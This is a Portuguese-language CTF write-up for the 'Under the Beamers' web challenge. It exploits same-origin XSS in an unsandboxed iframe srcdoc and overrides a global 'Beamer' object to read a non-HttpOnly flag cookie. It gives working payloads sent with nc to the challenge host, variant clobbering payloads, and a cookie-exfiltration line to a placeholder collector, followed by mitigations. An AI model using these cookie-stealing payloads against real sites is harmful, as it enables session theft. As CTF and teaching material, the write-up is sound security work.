# Under the Beamers — Write-up (Web / XSS + DOM Clobbering)

> **Desafio:** “Under the Beamers – Clobbered or not clobbered, that’s the question :)”  
> **Alvos:**  
> • App: `http://65.109.209.215:5000`  
> • Bot: porta `4000` (recebe HTML e visita a App com um cookie secreto)  
> **Flag format:** `ASIS{...}`

---

## 1) Resumo da solução

Exploramos um **XSS em mesma origem** dentro de um `<iframe srcdoc>` que injeta o script do **Beamer**. O app chama `Beamer.update(...)` com `setTimeout`. Em paralelo, o **bot** injeta **`document.cookie` com a flag** (não-HttpOnly) no domínio da app antes de visitar a página.  
A exploração final usa um **getter via `Object.defineProperty(window, "Beamer", ...)`** para executar **antes** do `setTimeout` e **no frame principal**, garantindo que o `console.log` com a cookie (que contém a flag) volte para nós no terminal.

PoC final (enviado para o **bot** na porta **4000**):
```html
<script>
Object.defineProperty(window, "Beamer", {
  get: function(){
    console.log("FLAG:", document.cookie);
    return {};
  }
});
</script>
```

---

## 2) Entendendo a aplicação (recon)

O arquivo disponibilizado no desafio (TXZ) revela duas partes:

- **App (Flask, porta 5000)**  
  - Renderiza um HTML com uma **textarea** e um **iframe** que usa `srcdoc` para renderizar o conteúdo do usuário.
  - Dentro do `srcdoc`, injeta:
    - `beamer-embed.js` (vendorizado localmente)
    - Uma chamada programada: `setTimeout(() => { Beamer.update({ language: "FR" }) }, 1000);`

- **Bot (Node + Puppeteer, porta de entrada 4000)**  
  - Recebe **uma string de HTML** via TCP.  
  - **Define um cookie** no domínio da app *antes* de visitar a URL (domínio interno `under-the-beamers-app.internal:5000`):  
    - `name: flag`  
    - `value: process.env.FLAG`  
    - `httpOnly: false`  ⟵ **chave** (JS pode ler `document.cookie`)  
  - Visita:  
    ```
    http://under-the-beamers-app.internal:5000/?html=<SEU_HTML_URL_ENCODED>
    ```
  - Encaminha **`console.log` do frame principal** de volta para nosso terminal (os logs que vimos: “Initializing Beamer…”).

**Conclusão de recon:**  
- O `iframe srcdoc` está em **mesma origem** com o documento pai.  
- O Beamer será referenciado e atualizado 1s depois.  
- O cookie `flag` estará acessível por JS quando for executado no mesmo domínio.  
- Se conseguirmos **executar no frame principal** (ou fazer o principal logar), capturamos a flag via `console.log`.

---

## 3) Superfície de ataque

1) **XSS via “editor”**: nosso HTML vira o conteúdo do `srcdoc` do iframe (mesma origem).  
2) **DOM clobbering / sobrescrita do Beamer**: o app usa `Beamer.update(...)` sem checar origem/estado — podemos controlar `Beamer`.  
3) **Coleta da flag**: como `httpOnly: false`, `document.cookie` revela `flag=ASIS{...}`.

---

## 4) Tentativas e por que não deram “log”

- **Clobber tradicional com `id=Beamer` + `Beamer.update = function(){...}`**:  
  Executou, mas **o `console.log` rodou no iframe** (nem sempre encaminhado pelo bot) **ou tarde demais** (após o listener do bot).

- **Exfiltração externa (Image/Fetch/Beacon/Location)**:  
  Pode ser bloqueada pelo ambiente (domínios/bloqueios/bastion) — e mesmo quando “ok”, não vimos evidência na saída do bot.

- **`parent.console.log(...)`/injeção de script no pai**:  
  Em tese deveria funcionar (mesma origem), mas ainda existe a questão de **timing** (o bot fecha logo após a navegação e os eventos do Beamer) e **quais frames têm logs capturados**.

---

## 5) Exploit final (getter em `window.Beamer`)

A sacada: **sobrescrever o `Beamer` com um *getter***; assim, na **primeira vez que a app ler `Beamer`**, nosso código executa **antes** do `setTimeout` e **no frame principal** (o que garante que o `console.log` é capturado).

### Payload final (enviar ao bot – porta 4000)
```bash
cat <<'HTML' | nc 65.109.209.215 4000
<script>
Object.defineProperty(window, "Beamer", {
  get: function(){
    console.log("FLAG:", document.cookie);
    return {};
  }
});
</script>
HTML
```

### Resultado esperado
No terminal (onde você rodou `nc`), aparece algo como:
```
[T1]> console.log | FLAG: flag=ASIS{...}; outras=cookies; ...
```
O que vem após `flag=` é a **flag do desafio**.

---

## 6) Por que funciona (explicação técnica)

- O **getter** em `window.Beamer` intercepta **qualquer acesso** à propriedade `Beamer` do `window`.  
- O app/Beamer (script vendorizado) inevitavelmente toca em `window.Beamer` logo ao carregar → **dispara o nosso getter**.  
- O getter roda **no frame principal** e **antes do `setTimeout`** da app, garantindo que:  
  - o log é capturado pelo bot;  
  - a cookie já está presente (o bot definiu antes de navegar).  
- Como a cookie não é HttpOnly, `document.cookie` revela `flag=ASIS{...}`.

---

## 7) Procedimento completo (passo a passo)

1. **Abrir terminal no Kali/WSL/Linux**.  
2. **Enviar payload para o bot**:
   ```bash
   cat <<'HTML' | nc 65.109.209.215 4000
   <script>
   Object.defineProperty(window, "Beamer", {
     get: function(){
       console.log("FLAG:", document.cookie);
       return {};
     }
   });
   </script>
   HTML
   ```
3. **Observar a saída**: aguarde o “Starting the browser…”, “Going to the app…”, “Initializing Beamer…”, e então o **`console.log` com `FLAG: flag=ASIS{...}`**.  
4. **Copiar a flag** e submeter no CTF.

---

## 8) Variantes úteis

- **Redefinir `console.log`**:
  ```html
  <script>
  console.log = function(){
    arguments[0] = "FLAG: " + document.cookie;
    parent.console.__proto__.log.apply(console, arguments);
  }
  </script>
  ```

- **Clobbering clássico**:
  ```html
  <form id=Beamer></form><script>
    Beamer.update=function(){
      console.log('FLAG:', document.cookie);
    }
  </script>
  ```

- **Exfiltração externa**:
  ```html
  <form id=Beamer></form><script>
    Beamer.update=function(){
      new Image().src='https://SEU-COLLECTOR/hit?c='+encodeURIComponent(document.cookie);
    }
  </script>
  ```

---

## 9) Causa-raiz e mitigação

**Causas técnicas:**
- Execução de HTML arbitrário do usuário em **mesma origem** usando `iframe srcdoc` **sem sandbox**.  
- Uso de objeto global (`Beamer`) sem blindagem.  
- Cookie de flag sem `HttpOnly`.  

**Mitigações:**
- Isolar conteúdo do usuário (sandbox ou outro domínio).  
- CSP estrito (sem inline scripts).  
- Não expor cookies sensíveis a JS (`HttpOnly`).  

---

## 10) Conclusão

Exploração combina **XSS em mesma origem** + **substituição/interceptação de objeto global (`Beamer`)**.  
A técnica com `Object.defineProperty` garantiu execução no frame principal e log no terminal do bot.  
**Flag obtida com sucesso.**
